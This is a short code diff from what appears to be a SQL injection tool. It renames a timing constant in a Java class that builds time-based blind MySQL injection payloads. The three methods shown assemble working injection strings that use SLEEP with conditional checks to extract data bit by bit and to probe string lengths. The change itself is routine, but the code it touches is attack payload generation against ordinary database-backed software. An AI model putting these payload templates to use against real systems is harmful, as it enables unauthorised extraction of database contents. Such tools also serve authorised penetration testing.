@@ -223,17 +223,17 @@ public class MySQLVendor extends AbstractVendor {
 
     @Override
     public String getSqlTimeCheck(String check) {
-        return "+and+if(" + check + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
+        return "+and+if(" + check + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP_TIME + "))--+";
     }
 
     @Override
     public String getSqlTimeBitCheck(String inj, int indexCharacter, int bit) {
-        return "+and+if(ascii(substring(" + inj + "," + indexCharacter + ",1))%26" + bit + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
+        return "+and+if(ascii(substring(" + inj + "," + indexCharacter + ",1))%26" + bit + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP_TIME + "))--+";
     }
 
     @Override
     public String getSqlTimeLengthCheck(String inj, int indexCharacter) {
-        return "+and+if(char_length(" + inj + ")>" + indexCharacter + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
+        return "+and+if(char_length(" + inj + ")>" + indexCharacter + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP_TIME + "))--+";
     }
 
     @Override
